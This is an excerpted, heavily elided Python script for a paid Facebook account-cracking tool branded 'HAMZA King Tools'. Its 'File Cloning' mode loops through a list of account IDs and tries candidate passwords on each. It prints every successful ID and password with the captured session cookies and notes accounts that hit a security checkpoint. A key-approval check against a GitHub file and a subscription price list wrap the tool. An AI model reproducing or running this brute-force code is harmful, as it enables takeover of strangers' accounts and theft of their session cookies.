...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mHAMZA')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'HAMZA' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  HAMZA,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/HAMZA.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\  /$$$$$$  /$$   /$$
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Shayan ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • ShaYan Khan ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mShayan khan ]   ║\33[1;34m   
╠══[Whatsapp                 • 0315xxxxxx ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	HAMZAj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	HAMZAj('\033[0;97m===============================================')
	HAMZA= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if HAMZA in ['m']:
		public()
	elif HAMZA in ['1']:
		crack_file()
		...
		result()
	elif HAMZA in ['2','02']:os.system('xdg-openhttps://www.facebook.com/SHaYaNoHaRaMi007?mibextid=ZbWKwL  ')
	elif HAMZA in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[HAMZA-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#HAMZA-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•HAMZA-Cp] {idf} • {pw}')     
				...
				#HAMZA-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•HAMZA-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " HAMZA,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/SHaYanxALyan/hamza/blob/main/approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HAMZA King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+HAMZA+key1)
